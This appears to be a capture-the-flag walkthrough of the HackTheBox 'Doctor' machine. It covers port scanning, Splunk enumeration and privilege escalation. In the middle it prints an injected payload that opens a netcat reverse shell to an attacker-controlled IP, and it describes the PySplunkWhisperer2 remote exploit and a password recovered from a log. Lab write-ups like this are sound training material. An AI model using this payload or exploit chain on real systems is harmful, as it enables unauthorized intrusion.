# HackTheBox-Doctor

## NMAP

```
Nmap scan report for 10.10.10.209
Host is up (0.21s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80

<img src="https://imgur.com/byFNRNC.png"/>

Looking at source code we see a domain name `doctors.htb`

<img src="https://imgur.com/XBNWOzc.png"/>

So let's try to add this on to our `/etc/hosts`

<img src="https://imgur.com/S0jQu4X.png"/>

## doctors.htb

<img src="https://imgur.com/fgUDmyL.png"/>

We can register and login with an account but it's not really useful 

## PORT 8089

<img src="https://imgur.com/S4Iafvg.png"/>

I tried searching for default credentials for `splunkd` beacause for navigating to `servicesNS` credentials are required so I tried `admin:admin` and `admin:changeme` but didn't worked

Then I found this repository on GitHub

<img src="https://imgur.com/lt10mJd.png"/>

We are going to use `PySplunkWhisperer2_remote`  because it's not being hosted on our machine

But this would not work becasue we need the credentials so I head over back to `doctors.htb` logged in as a new user at this point I didn't do it myself I had a little help from discord server

`<img src=http://IP/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'IP'$IFS'PORT')>`

<img src="https://imgur.com/wlMMBqk.png"/>

I didn't find anything on the box through manual enumeration so going to go with `linpeas`

<img src="https://imgur.com/MbdWgLO.png"/>

<img src="https://imgur.com/X6uDeig.png"/>

This was the only interesting thing that `linpeas` found

Reading `/var/log/apache2/backup`

<img src="https://imgur.com/ctoci6w.png"/>

`email=Guitar123`

Now I tried this at `doctors.htb/login` to reset the password but there was no email registered with this 

By ruuning linpeas and found that there is a  user named `shaun` so I guessed maybe this would be his password and I logged in with `shaun`

<img src=https://imgur.com/EKTuTGh.png/>

<img src="https://imgur.com/DiJJlpW.png"/>

Then I again ran `linpeas` 

<img src="https://imgur.com/UqNF3JG.png"/>

And found some credentials in form of `bcrypt` hash

`$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S`

But I could not crack this so I then returned to that exploit that we found and ran `python3 PySplunkWhisperer2_remote.py` 

<img src="https://imgur.com/X8OTA3p.png"/>

So this means that we are authenticated and now only need to include the payload


<img src="https://imgur.com/TkGzdYr.png"/>

And we are done , this wasn't really an "Easy" machine . Coming from TryHackMe , HackTheBox is way more diffcult 